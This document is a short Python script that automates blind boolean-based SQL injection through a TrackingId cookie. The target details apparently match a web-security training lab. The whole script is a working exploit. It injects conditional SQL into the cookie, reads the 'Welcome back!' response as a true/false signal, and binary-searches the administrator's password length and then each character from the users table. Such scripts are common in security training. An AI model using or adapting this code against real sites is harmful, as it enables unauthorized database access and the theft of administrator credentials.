import requests
import string

url = input("Enter the url(with any category): ")
tracking_id = input("Enter th tracking ID: ")
session_id = input("Enter the session ID: ")

s = requests.Session()

def check(payload):
    Tracking_ID = tracking_id + "' AND " + payload + "--"
    # print(f"Cookie: {Tracking_ID}")
    cookies = {"TrackingId": Tracking_ID, "session": session_id}
    result = s.get(url, cookies=cookies)
    return "Welcome back!" in result.text
    
def find_length():
    low_len = 1
    high_len = 51
    while (low_len < high_len):
        mid_len = (low_len + high_len) // 2        
        payload = f"LENGTH((SELECT password from users WHERE username='administrator')) > {mid_len}"
        if check(payload):
            low_len = mid_len + 1
        else:
            high_len = mid_len
    return high_len
        
def find_password(length):
    password = ""
    chars = string.ascii_lowercase + string.digits

    for i in range(1,length + 1):
        low = 48
        high = 122
        while (low < high):
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1)) > {mid}"
            if check(payload):
                low = mid + 1
            else:
                high = mid
        password += chr(high)
        print(f"[+] Position {i}: {chr(high)} → {password}")
    return password


if __name__ == "__main__":
    print("Finding length...")
    length = find_length()
    print(f"Password length: {length}")
    print("Finding password...")
    password = find_password(length)
    print(f"Password: {password}")